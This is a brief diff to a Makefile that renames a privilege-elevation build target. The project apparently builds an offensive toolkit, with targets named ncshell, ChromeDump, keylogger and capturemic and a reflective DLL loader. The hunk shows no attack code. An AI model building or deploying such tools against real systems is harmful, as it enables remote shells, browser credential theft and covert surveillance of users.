@@ -19,7 +19,7 @@ else
 	DEL += rm
 endif
 
-all: reflective_default ncshell elevate ChromeDump keylogger capturemic
+all: reflective_default ncshell runasadmin ChromeDump keylogger capturemic
 
 reflective_default:
 	$(COMPILER) ReflectiveDll.c ReflectiveLoader.c -c -m32
